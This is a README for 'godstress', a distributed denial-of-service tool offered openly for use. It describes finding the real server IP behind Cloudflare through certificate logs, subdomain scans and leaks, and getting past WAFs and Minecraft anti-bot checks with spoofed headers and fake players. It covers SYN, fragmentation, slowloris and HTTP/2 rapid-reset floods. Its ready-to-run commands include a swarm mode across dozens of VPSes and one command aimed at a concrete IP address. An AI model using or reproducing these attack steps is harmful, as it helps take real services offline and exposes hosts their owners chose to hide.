# godstress

Universal bypass tool: origin discovery + WAF + anti-bot + proxy + firewall + rate limit bypass + distributed swarm.

## Bypass methods

### Origin discovery
- cert transparency (crt.sh)
- subdomain scan (origin, direct, backend, api, mail, ftp, cpanel, webmail, mc, play, node, panel, game, srv, dynmap, map)
- SPF/DKIM/DMARC records
- SecurityTrails API (if key provided)
- Dynmap/BlueMap leak detection
- Discord webhook leak detection

### Cloudflare Spectrum bypass
- detects CF IP ranges
- skips CF IPs, floods origin directly
- Dynmap/BlueMap on origin IP (common leak)

### WAF bypass
- spoofed headers (X-Forwarded-For, X-Real-IP, CF-Connecting-IP, True-Client-IP)
- 5 rotating User-Agents
- randomized accept/language/encoding

### Anti-bot bypass (Minecraft)
- spoofed player names (real-looking)
- randomized protocol versions
- random delays between joins
- login state switching

### Firewall bypass
- SYN flood (conntrack exhaustion)
- IP fragmentation flood (reassembly buffer exhaustion)

### Rate limit bypass
- slow requests (partial data, long delays)
- distributed across IPs

### Proxy bypass
- direct origin hit with Host header = domain

## Usage

```bash
# discover origin only
python3 godstress.py example.com --discover

# check Dynmap/BlueMap leak
python3 godstress.py example.com --dynmap

# full bypass pipeline (discover + verify + flood)
python3 godstress.py example.com -p 25565 -c 1000 -d 300 -m mc_login --bypass --confirm

# flood known origin
python3 godstress.py example.com -p 25565 -c 1000 -d 300 -m mc_login syn slow --origin ORIGIN_IP --confirm

# L7 bypass on origin
python3 godstress.py example.com -p 443 -c 2000 -d 300 -m l7 syn slow --origin ORIGIN_IP --ssl --confirm
```

## Swarm mode (distributed across N servers)

```bash
# 1. create servers.txt with your VPS IPs (one per line)
# 2. test connectivity
python3 swarm.py --servers servers.txt --target example.com --test

# 3. deploy tool to all nodes
python3 swarm.py --servers servers.txt --target example.com --deploy --confirm

# 4. run swarm (53 servers, 500 conns each = 26500 total conns)
python3 swarm.py --servers servers.txt --target example.com -p 443 -c 500 -d 300 -m http h2rapid slowloris --ssl --confirm

# 5. with bypass mode
python3 swarm.py --servers servers.txt --target example.com -p 25565 -c 500 -d 300 -m mc_login mc_status --bypass --confirm

# 6. with origin IP
python3 swarm.py --servers servers.txt --target example.com -p 443 -c 500 -d 300 -m http h2rapid --origin 43.245.84.10 --ssl --confirm
```

### Power scaling

| Servers | Conns/server | Total conns | Effective power |
|---|---|---|---|
| 1 | 500 | 500 | 1 Gbps |
| 10 | 500 | 5,000 | 10 Gbps |
| 53 | 500 | 26,500 | 53 Gbps |
| 53 | 500 + amp lists | 26,500 | Tbps (with reflectors) |

## Install

```bash
pip install aiohttp
# optional
pip install uvloop dnspython
```
